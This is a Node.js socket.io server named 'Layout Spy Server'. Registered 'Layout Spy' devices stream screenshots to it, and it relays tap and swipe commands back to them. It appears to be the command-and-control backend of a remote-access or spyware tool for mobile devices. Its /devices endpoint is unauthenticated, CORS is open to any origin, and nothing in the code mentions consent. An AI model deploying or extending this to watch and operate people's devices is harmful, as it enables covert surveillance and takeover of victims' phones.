const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000,
    maxHttpBufferSize: 100 * 1024 * 1024 // 100MB for layout frames
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(deviceId);
            console.log('📱 Layout Spy registered:', deviceId, deviceInfo.status);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // 🔥 LAYOUT FRAMES (High quality PNG)
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            // Update last seen
            const deviceInfo = devices.get(deviceId);
            devices.set(deviceId, { ...deviceInfo, lastSeen: Date.now() });
            
            socket.to(deviceId).emit('screen-frame', data);
        }
    });

    // 🎮 PERFECT CONTROL RELAY
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x) || 0, 
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0, 
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0, 
                endY: parseFloat(endY) || 0
            });
            console.log('🎮 Control:', action, '→', deviceId, 
                       `(${x||startX},${y||startY})`);
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Disconnect:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Layout Spy offline:', deviceId);
                break;
            }
        }
    });
});

// Keepalive cleanup
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected === false && (now - info.lastSeen) > 60000) {
            devices.delete(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log('🧹 Cleanup:', deviceId);
        }
    }
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Layout Spy Server: http://localhost:${PORT}`);
    console.log(`📱 Web Panel: http://localhost:${PORT}`);
    console.log(`🎯 Ready for Layout Spies!`);
});
